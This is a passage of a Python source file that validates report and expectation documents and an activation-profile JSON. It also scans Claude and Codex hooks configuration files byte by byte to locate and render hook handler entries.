        result.append(line)
    return result



def parse_findings(lines: list[str]) -> tuple[str, list[tuple[str, ...]]]:
    content = [line for line in section_lines(lines, "Findings") if line]
    if len(content) < 2:
        raise ValueError("Findings must contain a header and separator")
    header = content[0]
    if header != FINDINGS_HEADER:
        raise ValueError("Findings header is malformed")
    if content[1] != FINDINGS_SEPARATOR:
        raise ValueError("Findings separator is malformed")

    rows: list[tuple[str, ...]] = []
    for line in content[2:]:
        if not line.startswith("|") or not line.endswith("|"):
            raise ValueError(f"malformed Findings row: {line}")
        raw_cells = line.split("|")[1:-1]
        if len(raw_cells) != 7:
            raise ValueError(f"wrong Findings cell count: {line}")
        parsed: list[str] = []
        for raw_cell in raw_cells:
            if not raw_cell.startswith(" ") or not raw_cell.endswith(" "):
                raise ValueError(
                    f"Findings row lacks exact cell padding: {line}"
                )
            cell = raw_cell[1:-1]
            if (
                not cell
                or cell != cell.strip(" \t")
                or "\t" in cell
            ):
                raise ValueError(
                    f"Findings row has an invalid cell: {line}"
                )
            parsed.append(cell)
        rows.append(tuple(parsed))
    return header, sorted(rows)



def parse_observations(lines: list[str]) -> list[str]:
    section = section_lines(lines, "Observations")
    content = [line for line in section if line]
    if not content:
        raise ValueError("Observations must contain at least '- (none)'")
    if any(not line.startswith("- ") for line in content):
        raise ValueError(
            "Observations may contain only observation list items"
        )
    if content == ["- (none)"]:
        return []
    if "- (none)" in content:
        raise ValueError("Observations cannot mix '- (none)' with tokens")
    for line in content:
        match = re.fullmatch(
            r"- ([a-z0-9][a-z0-9-]*): (\S(?:.*\S)?)",
            line,
        )
        if match is None:
            raise ValueError(f"malformed observation line: {line}")
    return sorted(content)



def validate_activation_profile(path: Path) -> dict[str, Any]:
    """Validate the closed report/v5 fixture activation profile."""

    try:
        path_stat = path.lstat()
    except OSError as error:
        raise ValueError(
            f"cannot inspect activation profile {path}: {error}"
        ) from error
    if (
        not stat.S_ISREG(path_stat.st_mode)
        or path.is_symlink()
        or is_reparse(path_stat)
    ):
        raise ValueError(
            f"activation profile must be a safe regular file: {path}"
        )
    try:
        value = json.loads(path.read_text(encoding="utf-8"))
    except (OSError, UnicodeError, json.JSONDecodeError) as error:
        raise ValueError(
            f"cannot read activation profile {path}: {error}"
        ) from error
    required = {
        "version",
        "root_markers",
        "fallback_filenames",
        "project_doc_max_bytes",
        "budget_source",
        "codex_project_trust",
        "codex_hooks_feature",
    }
    if not isinstance(value, dict) or set(value) != required:
        raise ValueError(
            "activation profile must contain exactly version, root_markers, "
            "fallback_filenames, project_doc_max_bytes, budget_source, "
            "codex_project_trust, and codex_hooks_feature"
        )
    if value["version"] != ACTIVATION_PROFILE_SPEC:
        raise ValueError(
            f"activation profile expected version {ACTIVATION_PROFILE_SPEC}"
        )
    for field in ("root_markers", "fallback_filenames"):
        items = value[field]
        if items is None:
            continue
        if not isinstance(items, list) or not all(
            isinstance(item, str) for item in items
        ):
            raise ValueError(
                f"activation profile {field} must be a string array or null"
            )
    budget = value["project_doc_max_bytes"]
    if budget is not None and (
        isinstance(budget, bool)
        or not isinstance(budget, int)
        or budget < 0
    ):
        raise ValueError(
            "activation profile project_doc_max_bytes must be a "
            "non-negative integer or null"
        )
    if value["budget_source"] not in {
        "resolved",
        "documented-default",
    }:
        raise ValueError(
            "activation profile budget_source must be resolved or "
            "documented-default"
        )
    if value["codex_project_trust"] not in CODEX_PROJECT_TRUST_VALUES:
        raise ValueError(
            "activation profile codex_project_trust must be trusted, "
            "untrusted, or unknown"
        )
    if value["codex_hooks_feature"] not in CODEX_HOOKS_FEATURE_VALUES:
        raise ValueError(
            "activation profile codex_hooks_feature must be enabled, "
            "disabled, or unknown"
        )
    return {
        "contract": ACTIVATION_PROFILE_SPEC,
        "path": str(path),
        "profile": value,
    }



def expectation_activation_profile(
    expected_path: Path, expected_lines: list[str]
) -> dict[str, Any]:
    raw = header_value(expected_lines, "activation profile")
    if raw is None:
        raise ValueError("expectation is missing - activation profile:")
    if raw == "environment-dependent":
        return {
            "mode": "environment-dependent",
            "filtered_observations": sorted(
                LIVE_ACTIVATION_OBSERVATIONS | CAPABILITY_OBSERVATIONS
            ),
        }
    if not raw or raw == "." or "\\" in raw:
        raise ValueError(
            "activation profile path must be non-empty and use '/' separators"
        )
    relative = PurePosixPath(raw)
    if relative.is_absolute() or any(
        part in {"", ".", ".."} for part in relative.parts
    ):
        raise ValueError(
            "activation profile must be a contained relative path"
        )
    base = expected_path.parent.resolve()
    profile_path = base.joinpath(*relative.parts)
    profile_kind, _ = classify_path(base, raw)
    if profile_kind != "regular":
        raise ValueError(
            "activation profile must be a contained safe regular file "
            f"without linked parents: {raw} ({profile_kind})"
        )
    try:
        resolved = profile_path.resolve(strict=True)
        resolved.relative_to(base)
    except (OSError, ValueError) as error:
        raise ValueError(
            f"activation profile escapes expectation directory: {raw}"
        ) from error
    validated = validate_activation_profile(profile_path)
    return {
        "mode": "pinned",
        "profile": validated["profile"],
        "path": str(resolved),
        "filtered_observations": sorted(CAPABILITY_OBSERVATIONS),
    }



def observation_token(line: str) -> Optional[str]:
    if not line.startswith("- ") or ": " not in line:
        return None
    return line[2:].split(": ", 1)[0]



def compare_expectations(produced: Path, expected: Path) -> dict[str, Any]:
    actual_lines = normalized_text(produced)
    expected_lines = normalized_text(expected)
    actual_fields = validate_report_document(
        actual_lines, expectation=False
    )
    expected_fields = validate_report_document(
        expected_lines, expectation=True
    )
    activation = expectation_activation_profile(expected, expected_lines)
    differences: list[dict[str, Any]] = []

    scalar_pairs = (
        (
            "version",
            actual_fields["spec"],
            expected_fields["expectation"],
        ),
        (
            "scope excludes",
            actual_fields["scope excludes"],
            expected_fields["scope excludes"],
        ),
        (
            "onboarding",
            actual_fields["onboarding"],
            expected_fields["onboarding"],
        ),
    )
    for field, actual, wanted in scalar_pairs:
        if actual != wanted:
            differences.append({"field": field, "actual": actual, "expected": wanted})

    actual_header, actual_rows = parse_findings(actual_lines)
    expected_header, expected_rows = parse_findings(expected_lines)
    if actual_header != expected_header:
        differences.append(
            {
                "field": "findings header",
                "actual": actual_header,
                "expected": expected_header,
            }
        )
    if actual_rows != expected_rows:
        differences.append(
            {
                "field": "findings rows",
                "actual": actual_rows,
                "expected": expected_rows,
            }
        )

    actual_observations = parse_observations(actual_lines)
    expected_observations = parse_observations(expected_lines)
    filtered = set(activation["filtered_observations"])
    actual_observations = [
        line
        for line in actual_observations
        if observation_token(line) not in filtered
    ]
    expected_observations = [
        line
        for line in expected_observations
        if observation_token(line) not in filtered
    ]
    if actual_observations != expected_observations:
        differences.append(
            {
                "field": "observations",
                "actual": actual_observations,
                "expected": expected_observations,
            }
        )

    return {
        "pass": not differences,
        "produced": str(produced),
        "expected": str(expected),
        "activation_profile": activation,
        "differences": differences,
    }


# Hook carrier, hook intent, and hook projection mechanics.
class HooksCarrierError(ValueError):
    """A hooks-carrier failure carrying one closed reason token."""

    def __init__(self, reason: str, detail: str) -> None:
        super().__init__(f"{reason}: {detail}")
        self.reason = reason


_JSON_NUMBER_PATTERN = re.compile(
    rb"-?(?:0|[1-9][0-9]*)(?:\.[0-9]+)?(?:[eE][-+]?[0-9]+)?"
)



def _json_fail(index: int, detail: str) -> HooksCarrierError:
    return HooksCarrierError(
        "json-parse-error", f"{detail} at byte {index}"
    )



def _json_skip_ws(data: bytes, index: int) -> int:
    while index < len(data) and data[index] in b" \t\n\r":
        index += 1
    return index



def _json_scan_string(
    data: bytes, index: int
) -> tuple[dict[str, Any], int]:
    cursor = index + 1
    while cursor < len(data):
        byte = data[cursor]
        if byte == 0x5C:
            cursor += 2
            continue
        if byte == 0x22:
            end = cursor + 1
            raw = data[index:end]
            try:
                value = json.loads(raw.decode("utf-8"))
            except (UnicodeError, json.JSONDecodeError) as error:
                raise _json_fail(index, "invalid JSON string") from error
            if not isinstance(value, str):
                raise _json_fail(index, "invalid JSON string")
            return (
                {
                    "kind": "string",
                    "start": index,
                    "end": end,
                    "value": value,
                    "raw": raw.decode("utf-8"),
                },
                end,
            )
        if byte < 0x20:
            raise _json_fail(cursor, "control byte inside a JSON string")
        cursor += 1
    raise _json_fail(index, "unterminated JSON string")



def _json_scan_value(
    data: bytes, index: int
) -> tuple[dict[str, Any], int]:
    if index >= len(data):
        raise _json_fail(index, "expected a JSON value")
    byte = data[index]
    if byte == 0x7B:
        return _json_scan_object(data, index)
    if byte == 0x5B:
        return _json_scan_array(data, index)
    if byte == 0x22:
        return _json_scan_string(data, index)
    for literal, kind, value in (
        (b"true", "boolean", True),
        (b"false", "boolean", False),
        (b"null", "null", None),
    ):
        if data.startswith(literal, index):
            end = index + len(literal)
            return (
                {
                    "kind": kind,
                    "start": index,
                    "end": end,
                    "value": value,
                    "raw": literal.decode("ascii"),
                },
                end,
            )
    match = _JSON_NUMBER_PATTERN.match(data, index)
    if match is None:
        raise _json_fail(index, "expected a JSON value")
    raw = match.group(0).decode("ascii")
    value = json.loads(raw)
    return (
        {
            "kind": "integer" if isinstance(value, int) else "number",
            "start": index,
            "end": match.end(),
            "value": value,
            "raw": raw,
        },
        match.end(),
    )



def _json_scan_object(
    data: bytes, index: int
) -> tuple[dict[str, Any], int]:
    members: list[dict[str, Any]] = []
    cursor = _json_skip_ws(data, index + 1)
    if cursor < len(data) and data[cursor] == 0x7D:
        return (
            {
                "kind": "object",
                "start": index,
                "end": cursor + 1,
                "members": members,
            },
            cursor + 1,
        )
    while True:
        cursor = _json_skip_ws(data, cursor)
        if cursor >= len(data) or data[cursor] != 0x22:
            raise _json_fail(cursor, "expected a JSON object key")
        key_node, cursor = _json_scan_string(data, cursor)
        cursor = _json_skip_ws(data, cursor)
        if cursor >= len(data) or data[cursor] != 0x3A:
            raise _json_fail(
                cursor, "expected ':' after a JSON object key"
            )
        cursor = _json_skip_ws(data, cursor + 1)
        value_node, cursor = _json_scan_value(data, cursor)
        members.append(
            {
                "name": key_node["value"],
                "key_start": key_node["start"],
                "key_end": key_node["end"],
                "value": value_node,
                "member_start": key_node["start"],
                "member_end": value_node["end"],
            }
        )
        cursor = _json_skip_ws(data, cursor)
        if cursor < len(data) and data[cursor] == 0x2C:
            cursor += 1
            continue
        if cursor < len(data) and data[cursor] == 0x7D:
            return (
                {
                    "kind": "object",
                    "start": index,
                    "end": cursor + 1,
                    "members": members,
                },
                cursor + 1,
            )
        raise _json_fail(cursor, "expected ',' or '}' in a JSON object")



def _json_scan_array(
    data: bytes, index: int
) -> tuple[dict[str, Any], int]:
    elements: list[dict[str, Any]] = []
    cursor = _json_skip_ws(data, index + 1)
    if cursor < len(data) and data[cursor] == 0x5D:
        return (
            {
                "kind": "array",
                "start": index,
                "end": cursor + 1,
                "elements": elements,
            },
            cursor + 1,
        )
    while True:
        cursor = _json_skip_ws(data, cursor)
        value_node, cursor = _json_scan_value(data, cursor)
        elements.append(value_node)
        cursor = _json_skip_ws(data, cursor)
        if cursor < len(data) and data[cursor] == 0x2C:
            cursor += 1
            continue
        if cursor < len(data) and data[cursor] == 0x5D:
            return (
                {
                    "kind": "array",
                    "start": index,
                    "end": cursor + 1,
                    "elements": elements,
                },
                cursor + 1,
            )
        raise _json_fail(cursor, "expected ',' or ']' in a JSON array")



def json_span_document(data: bytes) -> dict[str, Any]:
    """Scan one JSON document into span-preserving nodes."""

    if data.startswith(b"\xef\xbb\xbf"):
        raise _json_fail(0, "leading UTF-8 BOM")
    cursor = _json_skip_ws(data, 0)
    node, cursor = _json_scan_value(data, cursor)
    cursor = _json_skip_ws(data, cursor)
    if cursor != len(data):
        raise _json_fail(cursor, "trailing bytes after the JSON document")
    return node



def _json_node_value(node: Mapping[str, Any]) -> Any:
    kind = node["kind"]
    if kind == "object":
        result: dict[str, Any] = {}
        for member in node["members"]:
            result[member["name"]] = _json_node_value(member["value"])
        return result
    if kind == "array":
        return [_json_node_value(item) for item in node["elements"]]
    return node["value"]



def _json_duplicate_keys(
    node: Mapping[str, Any], path: str = ""
) -> list[str]:
    duplicates: list[str] = []
    kind = node["kind"]
    if kind == "object":
        seen: set[str] = set()
        for member in node["members"]:
            name = member["name"]
            child = f"{path}.{name}" if path else name
            if name in seen:
                duplicates.append(child)
            seen.add(name)
            duplicates.extend(_json_duplicate_keys(member["value"], child))
    elif kind == "array":
        for index, item in enumerate(node["elements"]):
            duplicates.extend(
                _json_duplicate_keys(item, f"{path}[{index}]")
            )
    return duplicates



def _object_member(
    node: Mapping[str, Any], name: str
) -> Optional[dict[str, Any]]:
    if node["kind"] != "object":
        return None
    for member in node["members"]:
        if member["name"] == name:
            return member
    return None



def _line_indent(data: bytes, offset: int) -> Optional[str]:
    """Return the pure-whitespace indent of offset's line, else None."""

    start = data.rfind(b"\n", 0, offset) + 1
    prefix = data[start:offset]
    if not prefix:
        return ""
    if all(byte in b" \t" for byte in prefix):
        return prefix.decode("ascii")
    return None



def _span(start: int, end: int) -> dict[str, int]:
    return {"start": start, "end": end}



def _classify_host_keys(
    names: Iterable[str], host: Optional[str]
) -> tuple[list[str], list[str], list[str]]:
    """Split handler keys into passthrough, semantics-changing, unknown."""

    if host is None:
        declared = set().union(*HOOK_HOST_HANDLER_KEYS.values())
        passthrough = set().union(*HOOK_PASSTHROUGH_KEYS.values())
        semantics = set().union(*HOOK_SEMANTICS_CHANGING_KEYS.values())
    else:
        declared = set(HOOK_HOST_HANDLER_KEYS[host])
        passthrough = set(HOOK_PASSTHROUGH_KEYS[host])
        semantics = set(HOOK_SEMANTICS_CHANGING_KEYS[host])
    found_passthrough: list[str] = []
    found_semantics: list[str] = []
    unknown: list[str] = []
    for name in names:
        if name in declared:
            continue
        if name in passthrough:
            found_passthrough.append(name)
        elif name in semantics:
            found_semantics.append(name)
        else:
            unknown.append(name)
    return found_passthrough, found_semantics, unknown



def hooks_json_style(
    data: bytes, root: Optional[Mapping[str, Any]]
) -> dict[str, str]:
    """Infer the closed style(F) used to render new owned spans."""

    newline = "\r\n" if b"\r\n" in data else "\n"
    unit = HOOK_JSON_INDENT_UNITS[0]
    root_member_indent = unit
    member_indent: Optional[str] = None
    handler_form = "multi-line"
    if root is not None and root["kind"] == "object" and root["members"]:
        first = _line_indent(data, root["members"][0]["key_start"])
        if first:
            root_member_indent = first
    hooks_indent = root_member_indent
    hooks_member = (
        _object_member(root, "hooks") if root is not None else None
    )
    if hooks_member is not None:
        found = _line_indent(data, hooks_member["key_start"])
        if found is not None:
            hooks_indent = found
        hooks_node = hooks_member["value"]
        if hooks_node["kind"] == "object" and hooks_node["members"]:
            candidate = _line_indent(
                data, hooks_node["members"][0]["key_start"]
            )
            if (
                candidate is not None
                and candidate.startswith(hooks_indent)
                and candidate[len(hooks_indent) :]
                in HOOK_JSON_INDENT_UNITS
            ):
                unit = candidate[len(hooks_indent) :]
                member_indent = candidate
    if member_indent is None:
        member_indent = hooks_indent + unit
    one_line = 0
    multi_line = 0
    for handler in _iterate_handler_nodes(root):
        if b"\n" in data[handler["start"] : handler["end"]]:
            multi_line += 1
        else:
            one_line += 1
    if one_line and not multi_line:
        handler_form = "one-line"
    return {
        "indent": unit,
        "newline": newline,
        "handler_form": handler_form,
        "root_member_indent": root_member_indent,
        "hooks_indent": hooks_indent,
        "member_indent": member_indent,
        "group_indent": member_indent + unit,
        "handler_indent": member_indent + unit * 3,
    }



def _iterate_handler_nodes(
    root: Optional[Mapping[str, Any]]
) -> Iterable[Mapping[str, Any]]:
    if root is None or root["kind"] != "object":
        return
    hooks_member = _object_member(root, "hooks")
    if hooks_member is None or hooks_member["value"]["kind"] != "object":
        return
    for event in hooks_member["value"]["members"]:
        array = event["value"]
        if array["kind"] != "array":
            continue
        for group in array["elements"]:
            if group["kind"] != "object":
                continue
            handlers = _object_member(group, "hooks")
            if handlers is None or handlers["value"]["kind"] != "array":
                continue
            for handler in handlers["value"]["elements"]:
                if handler["kind"] == "object":
                    yield handler


def _handler_record(
    data: bytes,
    node: Mapping[str, Any],
    index: int,
    host: Optional[str],
    unmodelled: list[str],
) -> dict[str, Any]:
    keys: list[dict[str, Any]] = []
    scalars: dict[str, Any] = {}
    for member in node["members"]:
        value = member["value"]
        scalar = value["kind"] in {"string", "integer", "boolean"}
        keys.append(
            {
                "name": member["name"],
                "key_span": _span(member["key_start"], member["key_end"]),
                "value_span": _span(value["start"], value["end"]),
                "raw": data[value["start"] : value["end"]].decode(
                    "utf-8", "replace"
                ),
                "scalar": scalar,
            }
        )
        if scalar:
            scalars[member["name"]] = value["value"]
    handler_type = scalars.get("type")
    if not isinstance(handler_type, str):
        unmodelled.append(f"handler {index} has no string 'type'")
        handler_type = None
    passthrough, semantics, unknown = _classify_host_keys(
        (member["name"] for member in node["members"]), host
    )
    status = scalars.get("statusMessage")
    marker_id = None
    if isinstance(status, str):
        marker = HOOK_MARKER_PATTERN.match(status)
        if marker is not None:
            marker_id = marker.group(1)
    timeout = scalars.get("timeout")
    if isinstance(timeout, bool) or not isinstance(timeout, int):
        timeout = None
    return {
        "index": index,
        "span": _span(node["start"], node["end"]),
        "one_line": b"\n" not in data[node["start"] : node["end"]],
        "keys": keys,
        "type": handler_type,
        "command": scalars.get("command")
        if isinstance(scalars.get("command"), str)
        else None,
        "commandWindows": scalars.get("commandWindows")
        if isinstance(scalars.get("commandWindows"), str)
        else None,
        "timeout": timeout,
        "statusMessage": status if isinstance(status, str) else None,
        "marker_id": marker_id,
        "passthrough_keys": sorted(passthrough),
        "semantics_changing_keys": sorted(semantics),
        "unknown_keys": sorted(unknown),
    }



def _group_record(
    data: bytes,
    node: Mapping[str, Any],
    index: int,
    host: Optional[str],
    unmodelled: list[str],
) -> dict[str, Any]:
    matcher_member = _object_member(node, "matcher")
    matcher: dict[str, Any] = {
        "present": matcher_member is not None,
        "value": None,
        "span": None,
    }
    if matcher_member is not None:
        matcher_node = matcher_member["value"]
        if matcher_node["kind"] != "string":
            unmodelled.append(f"group {index} matcher is not a string")
        else:
            matcher["value"] = matcher_node["value"]
        matcher["span"] = _span(matcher_node["start"], matcher_node["end"])
        matcher["member_span"] = _span(
            matcher_member["member_start"], matcher_member["member_end"]
        )
    handlers_member = _object_member(node, "hooks")
    handlers: list[dict[str, Any]] = []
    hooks_span = None
    if handlers_member is None or handlers_member["value"]["kind"] != "array":
        unmodelled.append(f"group {index} has no 'hooks' array")
    else:
        array = handlers_member["value"]
        hooks_span = _span(array["start"], array["end"])
        for position, handler in enumerate(array["elements"]):
            if handler["kind"] != "object":
                unmodelled.append(
                    f"group {index} handler {position} is not an object"
                )
                continue
            handlers.append(
                _handler_record(data, handler, position, host, unmodelled)
            )
    names = [member["name"] for member in node["members"]]
    if host is None:
        group_passthrough = set().union(*HOOK_PASSTHROUGH_KEYS.values())
    else:
        group_passthrough = set(HOOK_PASSTHROUGH_KEYS[host])
    extra = [name for name in names if name not in HOOK_GROUP_KEY_ORDER]
    return {
        "index": index,
        "span": _span(node["start"], node["end"]),
        "matcher": matcher,
        "hooks_span": hooks_span,
        "keys": names,
        "passthrough_keys": sorted(
            name for name in extra if name in group_passthrough
        ),
        "unknown_keys": sorted(
            name for name in extra if name not in group_passthrough
        ),
        "handlers": handlers,
    }



def inspect_hooks_json(
    data: bytes, *, host: Optional[str] = None
) -> dict[str, Any]:
    """Inspect one hooks JSON carrier, span-preserving and fail-closed."""

    if host is not None and host not in HOOK_CARRIER_PATHS:
        raise ValueError(f"invalid hook host: {host}")
    result: dict[str, Any] = {
        "contract": HOOKS_JSON_INSPECTION_SPEC,
        "ok": False,
        "host": host,
        "parse_error": None,
        "duplicate_keys": [],
        "unmodelled": [],
        "anomalies": [],
        "top_level_keys": [],
        "description_span": None,
        "hooks_span": None,
        "events": [],
        "markers": [],
        "style": hooks_json_style(data, None),
    }
    try:
        root = json_span_document(data)
    except HooksCarrierError as error:
        result["parse_error"] = str(error)
        result["anomalies"] = ["parse-error"]
        return result
    try:
        reference = json.loads(data.decode("utf-8"))
    except (UnicodeError, json.JSONDecodeError) as error:
        result["parse_error"] = f"json-parse-error: {error}"
        result["anomalies"] = ["parse-error"]
        return result
    unmodelled: list[str] = []
    if _json_node_value(root) != reference:
        unmodelled.append("span scanner disagrees with the JSON parser")
    duplicates = _json_duplicate_keys(root)
    result["duplicate_keys"] = duplicates
    result["style"] = hooks_json_style(data, root)
    if root["kind"] != "object":
        unmodelled.append("carrier root is not a JSON object")
        result["unmodelled"] = unmodelled
        result["anomalies"] = _carrier_anomalies(duplicates, unmodelled)
        return result
    result["top_level_keys"] = [
        member["name"] for member in root["members"]
    ]
    description = _object_member(root, "description")
    if description is not None:
        result["description_span"] = _span(
            description["value"]["start"], description["value"]["end"]
        )
    hooks_member = _object_member(root, "hooks")
    if hooks_member is not None:
        hooks_node = hooks_member["value"]
        result["hooks_span"] = _span(hooks_node["start"], hooks_node["end"])
        if hooks_node["kind"] != "object":
            unmodelled.append("'hooks' is not a JSON object")
        else:
            for member in hooks_node["members"]:
                array = member["value"]
                if array["kind"] != "array":
                    unmodelled.append(
                        f"event {member['name']} is not an array"
                    )
                    continue
                groups: list[dict[str, Any]] = []
                for index, group in enumerate(array["elements"]):
                    if group["kind"] != "object":
                        unmodelled.append(
                            f"event {member['name']} group {index}"
                            " is not an object"
                        )
                        continue
                    groups.append(
                        _group_record(data, group, index, host, unmodelled)
                    )
                result["events"].append(
                    {
                        "event": member["name"],
                        "key_span": _span(
                            member["key_start"], member["key_end"]
                        ),
                        "member_span": _span(
                            member["member_start"], member["member_end"]
                        ),
                        "array_span": _span(array["start"], array["end"]),
                        "groups": groups,
                    }
                )
    for event in result["events"]:
        for group in event["groups"]:
            for handler in group["handlers"]:
                if handler["marker_id"] is not None:
                    result["markers"].append(
                        {
                            "id": handler["marker_id"],
                            "event": event["event"],
                            "group": group["index"],
                            "handler": handler["index"],
                        }
                    )
    result["unmodelled"] = unmodelled
    result["anomalies"] = _carrier_anomalies(duplicates, unmodelled)
    result["ok"] = not result["anomalies"]
    return result



def _carrier_anomalies(
    duplicates: list[str], unmodelled: list[str]
) -> list[str]:
    anomalies: list[str] = []
    if duplicates:
        anomalies.append("duplicate-key")
    if unmodelled:
        anomalies.append("unmodelled-shape")
    return anomalies



def _carrier_failure_reason(inspection: Mapping[str, Any]) -> Optional[str]:
    if "parse-error" in inspection["anomalies"]:
        return "json-parse-error"
    if "duplicate-key" in inspection["anomalies"]:
        return "duplicate-key"
    if "unmodelled-shape" in inspection["anomalies"]:
        return "unmodelled"
    return None



def _event_record(
    inspection: Mapping[str, Any], event: str
) -> Optional[Mapping[str, Any]]:
    for candidate in inspection["events"]:
        if candidate["event"] == event:
            return candidate
    return None



def _matching_groups(
    event_record: Mapping[str, Any], matcher: Optional[str]
) -> list[Mapping[str, Any]]:
    found: list[Mapping[str, Any]] = []
    for group in event_record["groups"]:
        present = group["matcher"]["present"]
        value = group["matcher"]["value"]
        if matcher is None and not present:
            found.append(group)
        elif matcher is not None and present and value == matcher:
            found.append(group)
    return found



def _event_insertion_position(
    data: bytes,
    inspection: Mapping[str, Any],
    hooks_node_span: Mapping[str, int],
    event: str,
) -> tuple[int, int, str, str]:
    """Return (at, end, prefix, suffix) for a new hooks.<Event> member."""

    style = inspection["style"]
    newline = style["newline"]
    member_indent = style["member_indent"]
    hooks_indent = style["hooks_indent"]
    names = [item["event"] for item in inspection["events"]]
    if not names:
        return (
            hooks_node_span["start"] + 1,
            hooks_node_span["end"] - 1,
            newline + member_indent,
            newline + hooks_indent,
        )
    ascending = all(
        names[index] < names[index + 1] for index in range(len(names) - 1)
    )
    if ascending:
        for item in inspection["events"]:
            if event < item["event"]:
                start = item["member_span"]["start"]
                return (start, start, "", "," + newline + member_indent)
    last = inspection["events"][-1]["member_span"]["end"]
    return (last, last, "," + newline + member_indent, "")



def _span_failure(
    result: dict[str, Any], reason: str
) -> dict[str, Any]:
    if reason not in HOOK_CARRIER_FAILURE_REASONS:
        raise ValueError(f"unregistered json-span failure: {reason}")
    result["reason"] = reason
    return result



def locate_json_span(
    data: bytes,
    *,
    event: str,
    matcher: Optional[str],
    host: Optional[str] = None,
    require_existing: bool = False,
) -> dict[str, Any]:
    """Locate the owned span or insertion point for one hooks group."""

    inspection = inspect_hooks_json(data, host=host)
    result: dict[str, Any] = {
        "contract": JSON_SPAN_SPEC,
        "ok": False,
        "event": event,
        "matcher": matcher,
        "reason": None,
    }
    reason = _carrier_failure_reason(inspection)
    if reason is not None:
        return _span_failure(result, reason)
    style = inspection["style"]
    newline = style["newline"]
    if inspection["hooks_span"] is None:
        if require_existing:
            return _span_failure(result, "hooks-key-absent")
        root = json_span_document(data)
        if root["members"]:
            at = root["members"][-1]["member_end"]
            result.update(
                {
                    "ok": True,
                    "kind": "insertion",
                    "level": "hooks",
                    "at": at,
                    "end": at,
                    "prefix_bytes": "," + newline + style["hooks_indent"],
                    "suffix_bytes": "",
                }
            )
            return result
        root_indent = _line_indent(data, root["start"])
        result.update(
            {
                "ok": True,
                "kind": "insertion",
                "level": "hooks",
                "at": root["start"] + 1,
                "end": root["end"] - 1,
                "prefix_bytes": newline + style["hooks_indent"],
                "suffix_bytes": newline
                + ("" if root_indent is None else root_indent),
            }
        )
        return result
    event_record = _event_record(inspection, event)
    if event_record is None:
        if require_existing:
            return _span_failure(result, "event-absent")
        at, end, prefix, suffix = _event_insertion_position(
            data, inspection, inspection["hooks_span"], event
        )
        result.update(
            {
                "ok": True,
                "kind": "insertion",
                "level": "event",
                "at": at,
                "end": end,
                "prefix_bytes": prefix,
                "suffix_bytes": suffix,
            }
        )
        return result
    found = _matching_groups(event_record, matcher)
    if len(found) > 1:
        return _span_failure(result, "group-ambiguous")
    if len(found) == 1:
        commands = [
            handler
            for handler in found[0]["handlers"]
            if handler["type"] == "command"
        ]
        result.update(
            {
                "ok": True,
                "kind": "group",
                "span": found[0]["span"],
                "group_index": found[0]["index"],
                "handler_count": len(found[0]["handlers"]),
                "handler_span": (
                    commands[0]["span"] if len(commands) == 1 else None
                ),
            }
        )
        return result
    array = event_record["array_span"]
    if event_record["groups"]:
        last = event_record["groups"][-1]["span"]["end"]
        result.update(
            {
                "ok": True,
                "kind": "insertion",
                "level": "group",
                "at": last,
                "end": last,
                "prefix_bytes": "," + newline + style["group_indent"],
                "suffix_bytes": "",
            }
        )
        return result
    event_indent = _line_indent(data, event_record["key_span"]["start"])
    if event_indent is None:
        event_indent = style["member_indent"]
    result.update(
        {
            "ok": True,
            "kind": "insertion",
            "level": "group",
            "at": array["start"] + 1,
            "end": array["end"] - 1,
            "prefix_bytes": newline + style["group_indent"],
            "suffix_bytes": newline + event_indent,
        }
    )
    return result


def _render_json_scalar(value: Any) -> str:
    if isinstance(value, bool):
        return "true" if value else "false"
    if isinstance(value, int):
        return str(value)
    if isinstance(value, str):
        return json.dumps(value, ensure_ascii=False)
    raise ValueError(f"unrenderable hook scalar: {value!r}")



def _require_hook_string(
    value: Any, label: str, *, optional: bool = False
) -> Optional[str]:
    if value is None and optional:
        return None
    if not isinstance(value, str) or not value:
        raise ValueError(f"hook entry {label} must be a non-empty string")
    return value



def hook_entry_target(
    entry: Mapping[str, Any], host: str
) -> dict[str, Any]:
    """Resolve one entry's effective projected model for one host."""

    if host not in HOOK_CARRIER_PATHS:
        raise ValueError(f"invalid hook host: {host}")
    if not isinstance(entry, Mapping):
        raise ValueError("hook entry must be a JSON object")
    entry_id = _require_hook_string(entry.get("id"), "id")
    if re.fullmatch(r"[a-z0-9][a-z0-9-]*", entry_id) is None:
        raise ValueError(f"invalid hook entry id: {entry_id}")
    event = _require_hook_string(entry.get("event"), "event")
    targets = entry.get("targets")
    if not isinstance(targets, Mapping) or host not in targets:
        raise ValueError(f"hook entry has no targets.{host}")
    target = targets[host]
    if not isinstance(target, Mapping):
        raise ValueError(f"hook entry targets.{host} must be an object")
    surface = _require_hook_string(target.get("surface"), "surface")
    if surface not in HOOK_SURFACES[host]:
        raise ValueError(f"invalid {host} hook surface: {surface}")
    tier = _require_hook_string(target.get("tier"), "tier")
    if tier not in HOOK_TIERS:
        raise ValueError(f"invalid hook tier: {tier}")
    matcher = target.get("matcher")
    if matcher is None:
        matcher = entry.get("matcher")
    matcher = _require_hook_string(matcher, "matcher", optional=True)
    command = target.get("command")
    if command is None:
        command = entry.get("command")
    command = _require_hook_string(command, "command", optional=True)
    timeout = target.get("timeout")
    if timeout is None:
        timeout = entry.get("timeout")
    if timeout is not None and (
        isinstance(timeout, bool) or not isinstance(timeout, int)
    ):
        raise ValueError("hook entry timeout must be an integer")
    handler: dict[str, Any] = {"type": "command"}
    if command is not None:
        handler["command"] = command
    if host == "codex":
        windows = _require_hook_string(
            target.get("commandWindows"), "commandWindows", optional=True
        )
        if windows is not None:
            handler["commandWindows"] = windows
    if timeout is not None:
        handler["timeout"] = timeout
    if host == "claude":
        shell = target.get("shell")
        if shell is not None:
            if shell not in HOOK_CLAUDE_SHELLS:
                raise ValueError(f"invalid claude hook shell: {shell}")
            handler["shell"] = shell
    return {
        "id": entry_id,
        "event": event,
        "class": entry.get("class"),
        "enabled": entry.get("enabled"),
        "host": host,
        "surface": surface,
        "tier": tier,
        "matcher": matcher,
        "handler": handler,
        "status_message": entry.get("statusMessage"),
    }



def _hook_handler_members(
    model: Mapping[str, Any],
    *,
    host: str,
    creating: bool,
    passthrough: Optional[Iterable[Mapping[str, Any]]],
) -> list[tuple[str, str]]:
    handler = dict(model["handler"])
    status = model.get("status_message")
    if status is None:
        if host == "claude" or creating:
            status = f"[bridge:{model['id']}]"
    if status is not None:
        if not isinstance(status, str):
            raise ValueError("hook statusMessage must be a string")
        handler["statusMessage"] = status
    members: list[tuple[str, str]] = []
    for name in HOOK_HANDLER_KEY_ORDER + HOOK_HANDLER_TRAILING_KEY_ORDER:
        if name in handler:
            members.append((name, _render_json_scalar(handler[name])))
